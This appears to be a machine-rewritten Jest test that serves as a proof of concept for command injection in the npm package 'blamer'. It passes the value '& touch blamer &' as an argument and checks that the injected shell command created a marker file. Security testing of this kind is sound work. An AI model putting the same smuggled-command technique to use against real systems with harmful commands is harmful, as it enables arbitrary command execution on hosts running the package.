const v23 = async () => {
    const v13 = expect.assertions(2);
    v13;
    const Root = require('blamer');
    const fs = require('fs');
    const path = './blamer';
    try {
        const v14 = fs.existsSync(path);
        if (v14) {
            const v15 = fs.unlinkSync(path);
            v15;
        }
    } catch (err) {
        const v16 = console.error(err);
        v16;
    }
    file_exist = fs.existsSync(path);
    const v17 = expect(file_exist);
    const v18 = v17.toBe(false);
    v18;
    let attack_command = '& touch blamer &';
    root = new Root('git', attack_command);
    try {
        await root.blameByFile('./');
    } catch (err) {
    } finally {
        file_exist = fs.existsSync(path);
        const v19 = expect(file_exist);
        const v20 = v19.toBe(true);
        v20;
        const v21 = function (err) {
        };
        const v22 = fs.unlink(path, v21);
        v22;
    }
};
const v24 = test('Command Injection in blamer', v23);
v24;